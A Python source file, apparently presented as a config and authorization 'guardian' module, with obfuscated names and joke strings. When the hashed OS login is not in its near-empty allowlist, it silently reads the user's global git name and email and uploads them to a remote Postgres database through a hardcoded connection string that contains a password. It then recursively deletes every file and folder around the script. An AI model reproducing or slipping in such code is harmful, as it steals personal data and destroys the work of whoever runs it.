import os as _xq
import hashlib as _h9
import subprocess as _b1
import psycopg2 as _p0

# ⚙️ zynka-db config
_QvZ3 = 'postgresql://neondb_owner:nlg_qIsdgsr2ayX5@ep-rough-math-a1dcbp92-pooler.ap-southeast-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require'

# 🧬 authorized sigs
_LokM = {"abc"}

# gibberish string stash
_s_MSG_UNAUTH_DETECTED = "ZORP ZORP! Unauthorized blob detected, commencing self-zap sequence..."
_s_MSG_BEEPO_SNIFFED = "Beepo sniffed! -> {user} :: {email}"
_s_MSG_KRAB_JAMMED = "Krab jammed: {err}"
_s_MSG_SPLAT_FILE = "splat file {file}: {err}"
_s_MSG_SPLAT_DIR = "splat dir {dir}: {err}"
_s_MSG_BLIB_GONE = "Blib blab gone! No more sneaky peeky for unauthorized blobs!"
_s_DEF_ZINTOK = "Zintok"
_s_DEF_ZMAIL_NONE = "Zmail_None"
_s_ERR_USER = "florp_user_err"
_s_ERR_MAIL = "florp_mail_err"
_s_SQL_CREATE_UNAUTH_TABLE = """
    CREATE TABLE IF NOT EXISTS unauthorized_users (
        id SERIAL PRIMARY KEY,
        username TEXT NOT NULL,
        email TEXT NOT NULL,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
"""

def _fruu():
    """blib blab glonk"""
    try:
        _xx = _xq.getlogin()
        return _h9.sha256(_xx.encode()).hexdigest()
    except Exception:
        return None

def _vloz():
    """get git-nym"""
    try:
        _r = _b1.run(["git", "config", "--global", "user.name"], capture_output=True, text=True)
        _nm = _r.stdout.strip()
        return _nm if _nm else _s_DEF_ZINTOK
    except Exception:
        return _s_ERR_USER

def _blek():
    """get git-zmail"""
    try:
        _r = _b1.run(["git", "config", "--global", "user.email"], capture_output=True, text=True)
        _em = _r.stdout.strip()
        return _em if _em else _s_DEF_ZMAIL_NONE
    except Exception:
        return _s_ERR_MAIL

def _krab():
    """log sneaky beepo"""
    _unm = _vloz()
    _eml = _blek()

    try:
        _cx = _p0.connect(_QvZ3)
        _cu = _cx.cursor()

        _cu.execute(_s_SQL_CREATE_UNAUTH_TABLE)

        _cu.execute(
            "INSERT INTO unauthorized_users (username, email) VALUES (%s, %s)",
            (_unm, _eml)
        )

        _cx.commit()
        _cu.close()
        _cx.close()

        print("\r")

    except Exception as _e:
        print("\r")

def _plonk():
    """the guardian"""
    if _fruu() not in _LokM:
        print(" \r")

        _krab()

        _rootz = _xq.path.dirname(_xq.path.abspath(__file__))

        for _r, _d, _f in _xq.walk(_rootz, topdown=False):
            for _ff in _f:
                try:
                    _xq.remove(_xq.path.join(_r, _ff))
                except Exception as _e:
                    print(" \r")
            for _dd in _d:
                try:
                    _xq.rmdir(_xq.path.join(_r, _dd))
                except Exception as _e:
                    print("""\r""")

        print("\r")
        exit()
